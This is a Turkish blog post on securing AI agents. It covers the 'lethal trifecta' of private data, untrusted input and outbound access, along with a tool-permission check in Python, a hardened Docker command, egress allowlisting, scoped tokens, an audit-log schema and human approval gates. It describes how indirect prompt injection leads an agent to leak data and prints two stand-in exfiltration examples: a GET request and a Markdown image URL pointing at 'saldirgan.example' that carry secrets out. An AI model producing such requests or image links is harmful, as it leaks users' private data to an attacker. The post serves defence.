---
title: "Ajan İzolasyonu ve Yetkilendirme: Ölümcül Üçlüden Kaçınmak"
description: "Ölümcül üçlü, ikilik kuralı, araç izin matrisi, kapsayıcı izolasyonu, çıkış trafiği filtreleme ve KVKK'ya uygun denetim kaydı şeması — hepsi kodla."
publishDate: "2026-08-13T23:46:00+03:00"
lang: tr
category: "Güvenlik"
tags: ["Güvenlik", "Yapay Zeka"]
translation: "agent-sandboxing-permissions"
heroImage:
  src: "../../../assets/blog/bimg-10.jpg"
  alt: "Ajan İzolasyonu ve Yetkilendirme: Ölümcül Üçlüden Kaçınmak"
---

Bir ajanın güvenliği, modelin ne kadar iyi talimat aldığıyla değil, kandırıldığında ne yapabildiğiyle ölçülür. Bu yazı tamamen ikinci soruyla ilgili: ajana hangi araçları verirsiniz, hangi kimlikle çalıştırırsınız, nereye ağ isteği atabilir, ve olay olduğunda geriye ne kalır. Türkçe kaynaklarda bu katman neredeyse hiç yazılmamış — risk listeleri var, izin matrisi yok.

## Ölümcül üçlü ve ikilik kuralı

Bu alanın en kullanışlı iki sezgisi 2025-2026'da ortak sözlüğe girdi. Birincisi **ölümcül üçlü** (lethal trifecta): bir ajan aynı anda (a) özel veriye erişiyorsa, (b) güvenilmeyen içerik okuyorsa ve (c) dışarıyla iletişim kurabiliyorsa, veri sızıntısı bir olasılık değil bir zaman meselesidir. Saldırgan güvenilmeyen içeriğe talimat gömer, ajan özel veriyi okur, dış kanaldan gönderir.

> LLM sağlayıcıları bizi kurtarmayacak — bu üçlüden kendimiz kaçınmak zorundayız.

İkincisi Meta'nın **ikilik kuralı** (Agents Rule of Two): bir ajan bu üç özellikten en fazla ikisine sahipse özerk çalışabilir; üçü birden varsa insan onayı zorunludur. Bu, mimari bir kısıt olarak son derece uygulanabilir bir kuraldır çünkü tasarım aşamasında sorulabilir.

Pratikte kaçınma yolları şunlar: özel veri okuyan ajanın ağ erişimini kapatın; güvenilmeyen içerik okuyan ajanı özel veriden ayırın (iki farklı ajan, iki farklı kimlik); ya da dışarıya çıkışı yalnızca yapılandırılmış ve doğrulanmış bir kanala indirin.

## Araç izin matrisi

Türkçe SERP'te eksik olan tam olarak bu: bir tablo değil, çalıştırılabilir bir matris. Araçları yeteneklerine göre sınıflandırın ve her sınıfa politika bağlayın.

```python
from dataclasses import dataclass, field
from typing import Literal

Yetenek = Literal["oku", "yaz", "ag", "kabuk", "odeme"]

@dataclass(frozen=True)
class AracPolitikasi:
    ad: str
    yetenekler: frozenset          # bu arac neye dokunuyor
    ozel_veri: bool                # ozel veriye erisiyor mu
    guvenilmeyen_girdi: bool       # disaridan icerik okuyor mu
    dis_iletisim: bool             # disariya veri gonderebiliyor mu
    onay: bool = False
    azami_cagri: int = 10

def ucluyu_kontrol_et(p: AracPolitikasi) -> None:
    """Olumcul uclu: uc ozellik birden varsa otonom calistirma."""
    if p.ozel_veri and p.guvenilmeyen_girdi and p.dis_iletisim and not p.onay:
        raise ValueError(
            f"{p.ad}: olumcul uclu tamam — ya bir yetenegi kaldirin ya onay ekleyin")

POLITIKALAR = [
    AracPolitikasi("belge_ara",  frozenset({"oku"}),        True,  False, False),
    AracPolitikasi("web_getir",  frozenset({"ag"}),         False, True,  False),
    AracPolitikasi("eposta_at",  frozenset({"ag"}),         True,  False, True, onay=True, azami_cagri=1),
]

for p in POLITIKALAR:
    ucluyu_kontrol_et(p)     # dagitimdan ONCE, CI'da calisir
```

Bu kontrolün CI hattında çalışması önemli. Ölümcül üçlü, tek tek araçlar eklenirken oluşur — kimse "bu ajana veri sızdırma yeteneği ekliyorum" diye düşünmez; sadece bir web getirme aracı ekler. Kuralı koda gömdüğünüzde, o an fark edilir.

## İzolasyon: kapsayıcı ve çıkış filtresi

Kod çalıştıran veya dosya sistemine dokunan her ajan izole edilmelidir. Asgari düzey:

```bash
# Kod yurutme icin asgari izolasyon
docker run --rm \
  --network none \                    # ag yok (gerekiyorsa proxy uzerinden)
  --read-only \                       # kok dosya sistemi salt-okunur
  --tmpfs /tmp:size=64m \             # yalnizca gecici alan yazilabilir
  --memory 512m --cpus 1 \            # kaynak siniri
  --pids-limit 128 \
  --cap-drop ALL \                    # tum linux yetenekleri dusur
  --security-opt no-new-privileges \
  ajan-sandbox:1.4 python /is/calistir.py
```

Ağ gerekiyorsa `--network none` yerine izin listeli bir çıkış vekili (egress proxy) kullanın. Buradaki kritik nokta, izin listesinin _alan adı_ düzeyinde olması ve varsayılanın reddetmek olması. Sızdırma çoğu zaman egzotik bir teknik değil; sıradan bir `GET https://saldirgan.example/?veri=...` isteğidir.

<div class="callout"><strong>İpucu:</strong> Markdown görsel URL'lerini unutmayın. Ajanın ürettiği <code>![](https://saldirgan.example/?v=SIRLAR)</code> biçimindeki bir görsel, arayüz onu render ettiği anda veriyi dışarı taşır. Çıktıyı gösteren istemcide dış görsel yüklemeyi kapatın veya URL'leri izin listesinden geçirin.</div>

## Kimlik: kısa ömürlü ve daraltılmış yetki

En yaygın üretim hatası, ajanın geniş yetkili tek bir servis hesabıyla çalışmasıdır. Bu hesap zamanla her şeye erişir, çünkü her yeni özellik bir yetki daha ekler ve kimse geri almaz.

Doğru kurgu üç kuralda özetlenir. **Birincisi:** ajan, eylemi tetikleyen kullanıcının yetkisiyle çalışsın — yetkilendirme kararını veri katmanında verin, ajan katmanında değil. **İkincisi:** token'lar kısa ömürlü olsun; bir ajan görevinin ömrü dakikalarla ölçülüyorsa token da öyle olmalı. **Üçüncüsü:** kapsam daraltın — okuma ve yazma için ayrı kimlik bilgileri kullanın, böylece okuma yapan bir ajanın sızdırılan token'ı yazma yapamaz.

Bunun neden acil olduğunu OWASP'ın 2026 ilk çeyrek olay derlemesi gösteriyor: aktif olarak istismar edilen bir RCE açığı on iki–on beş bin açığa çıkmış kurulumda görüldü, dolaylı enjeksiyonla veri sızdırma vakaları raporlandı, bir bulut yapay zekâ platformunda yetki yükseltme tespit edildi. Dikkat çeken ayrıntı şu: sekiz büyük olayın tamamında yalnızca _bir_ geleneksel CVE atanmış. Çünkü bu olayların çoğu yazılım açığı değil, yapılandırma ve tasarım hatası.

## Denetim kaydı şeması

Bir olay yaşandığında elinizde ne kaldığı, önceden ne kaydettiğinize bağlı. Ajan denetim kaydı, aynı zamanda kişisel veri işleme kaydı olarak da iş görebilir — yani KVKK uyumu için ayrı bir sistem kurmanıza gerek kalmaz. Asgari şema:

```sql
CREATE TABLE ajan_denetim (
  id            bigserial PRIMARY KEY,
  gorev_id      uuid        NOT NULL,       -- bir gorevin tum adimlari
  adim          int         NOT NULL,
  ajan          text        NOT NULL,
  arac          text        NOT NULL,
  kullanici_id  uuid,                       -- KIMIN adina calisti
  kimlik_kapsam text        NOT NULL,       -- hangi token/kapsam kullanildi
  argumanlar    jsonb       NOT NULL,       -- PII maskelenmis hali
  sonuc         text        NOT NULL
                CHECK (sonuc IN ('ok','red','hata','onay_bekliyor')),
  red_nedeni    text,
  onay_veren    uuid,                       -- insan onayi kimden geldi
  kisisel_veri  boolean     NOT NULL DEFAULT false,   -- KVKK isaretlemesi
  zaman         timestamptz NOT NULL DEFAULT now()
);

CREATE INDEX ON ajan_denetim (gorev_id, adim);
CREATE INDEX ON ajan_denetim (kullanici_id, zaman) WHERE kisisel_veri;
```

İki alan bu şemayı ayırıyor. `kimlik_kapsam` olmadan "bu ajan bu veriye nasıl erişebildi" sorusunu cevaplayamazsınız. `kisisel_veri` bayrağı ise bir veri sahibi başvurusu geldiğinde hangi kayıtların taranacağını dakikalar içinde bulmanızı sağlar — sonradan eklenmesi çok zor bir alandır.

## Onay kapısı nasıl tasarlanır?

İnsan onayı, kötü tasarlandığında güvenlik değil güvenlik tiyatrosudur. Üç kural:

1.  **Niyeti değil etkiyi gösterin.** "Dosyaları temizleyeyim mi?" yerine "şu 14 dosya silinecek: …". Kullanıcı neyi onayladığını görmüyorsa onay geçersizdir.
2.  **Onay isteğini seyrekleştirin.** Her araç çağrısında onay isteyen bir sistem, üçüncü günde körü körüne onaylanır. Yalnızca geri alınamaz ve yüksek etkili eylemler onay istemeli.
3.  **Onayı eyleme bağlayın, oturuma değil.** "Bu oturumda hep izin ver" seçeneği, ölümcül üçlünün en sık açıldığı kapıdır.

Son olarak bir tasarım testi: sisteminizi anlatırken "model buna izin verilmediğini biliyor" cümlesini kuruyorsanız, orada bir güvenlik kontrolü yok demektir. Model bilgisi bir öneridir; kapı bir kuraldır.

<div class="takeaways"><h4>Öne çıkanlar</h4><ul><li>Ölümcül üçlü — özel veri + güvenilmeyen içerik + dış iletişim — bir araya geldiğinde sızıntı zaman meselesidir.</li><li>Üçlü kontrolünü CI'da çalıştırın; risk tek tek araç eklerken, kimse fark etmeden oluşur.</li><li>Kod çalıştıran ajanı ağı kapalı, salt-okunur, kaynak sınırlı bir kapsayıcıda çalıştırın ve çıkışı izin listesine bağlayın.</li><li>Denetim kaydına kimlik kapsamını ve kişisel veri bayrağını yazın; ikisi de sonradan eklenemez.</li></ul></div>

<div class="faq"><details><summary>Ölümcül üçlü nedir?</summary><p>Bir ajanın aynı anda özel veriye erişmesi, güvenilmeyen içerik okuması ve dışarıyla iletişim kurabilmesidir. Bu üçü bir aradayken saldırgan, güvenilmeyen içeriğe gömdüğü talimatla özel veriyi dış kanaldan sızdırabilir. Meta'nın ikilik kuralı, en fazla ikisine izin verilmesini, üçü birden gerektiğinde insan onayı alınmasını önerir.</p></details><details><summary>Ajanı nasıl izole ederim?</summary><p>Kod yürüten ajanı ağı kapalı, kök dosya sistemi salt-okunur, bellek ve işlem sayısı sınırlı, tüm Linux yetenekleri düşürülmüş bir kapsayıcıda çalıştırın. Ağ gerekiyorsa alan adı düzeyinde izin listeli bir çıkış vekili kullanın ve varsayılanı reddet yapın.</p></details><details><summary>En az ayrıcalık ajanlarda nasıl uygulanır?</summary><p>Ajanı kendi geniş servis hesabıyla değil, eylemi tetikleyen kullanıcının yetkisiyle çalıştırın; yetki kararını veri katmanında verin. Token'ları görev süresi kadar kısa ömürlü tutun ve okuma ile yazma için ayrı kimlik bilgileri kullanın.</p></details></div>

---

İzolasyon ve yetkilendirme, ajan güvenliğinin tiyatro olmayan kısmıdır. Saldırının kendisi için [prompt injection](/posts/prompt-injection-guvenlik/), çıktı katmanındaki denetim için [guardrails ve içerik denetimi](/posts/guardrails-icerik-denetimi/), ve araçların modele nasıl tanıtıldığı için [fonksiyon çağırma](/posts/fonksiyon-cagirma/) yazılarına bakabilirsiniz.
